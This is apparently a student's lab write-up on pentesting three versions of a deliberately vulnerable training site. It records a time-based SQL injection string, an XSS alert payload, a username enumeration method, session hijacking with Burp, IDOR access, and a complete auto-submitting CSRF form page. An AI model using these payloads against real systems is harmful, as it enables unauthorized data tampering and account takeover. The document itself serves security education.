# Week 8 - Pentesting Live Targets

Time spent: Roughly 11-12 hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQL Injection (SQLi)

 * This vulnerability is SQLi.
 * It is taken advantage of the hacker by simply inputting the statement instead of the employee's ID number.
 * %27%20OR%20SLEEP(5)=0--%27

Vulnerability #2: Session Hijacking/Fixation

 * This vulnerability is Session Hijacking/Fixation.
 * It is taken advantage of the hacker by gaining access to the victim's Session ID via hack tools. The session ID is then input to burp suite which changes the session ID and logs the attacker in without issue.
 * Using two seperate browsers, I was able to trick the chrome browser into believing that I was actually the victim.


## Green

Vulnerability #1: Cross-Site Scripting (XSS)

 * This vulnerability is XSS.
 * <script>alert('I found it!! YAY!');</script> is what I used. 
 * The attacker can inject XSS code within the feedback form.
 * The XSS runs as soon as the owner of the account looks at the feedback form.
 * XSS was awesome!

Vulnerability #2: Username Enumeration

 * This vulnerability is Username Enumeration.
 * By the site actually giving you hints and clues. You are able to see when you input jmonroe9 the feedback shows an unbold "Login was unsuccessful". This means that the username doesn't exist. On the other hand when you input jmonroe99 the feedback shows the unsuccessful message in bold which means that the username exists, you just have the wrong password.
 * After all of this, you can go through any list and figure out which would be valid and which wouldn't.
 * Another username is: pperson


## Red

Vulnerability #1: Cross-Site Request Forgery (CSRF)

 * This vulnerability was cross-site request forgery.
 * This was one of the more difficult ones for me. I kept having typos which lead to it not working at first.
 When I got it to work, it was a lot easier. 
 * It consists of creating a malicious page which in return allows the user's session to create a request to the database.
 > <html>
  <head>
    <title>This is a Blank Page!</title>
  </head>
  <body onload="document.CSRF.submit()">
	<form action="https://xx.xxx.xxx.xx/red/public/staff/salespeople/edit.php?id=5" method="post" style="display: none;" name='CSRF' target="res">
	    <input type="text" name="first_name" value="Mr. Ken Barker" />
      	<input type="text" name="last_name" value="YOU WERE HACKED" />
      	<input type="text" name="phone" value="123-456-7890" />
      	<input type="text" name="email" value="mrbarker@yougothacked.com" />
	</form>
    <iframe name="res" style="display: none;"></iframe>
  </body>
</html>

Vulnerability #2: Insecure Direct Object Reference

 * This vulnerability was Insecure Direct Object Reference.
 * The attacker (me) was allowed to view any account and even those that had been previously deactivated.
 * Simply look for previously deactivated accounts by guessing the low-number ID's.
 * There shouldn't be any feedback on an account that's been deactivated.


## Notes
This lab was difficult for me but fun at the same time. I spend a lot of time actually looking up more information on the types of attacks and what I should know before diving into the lab.
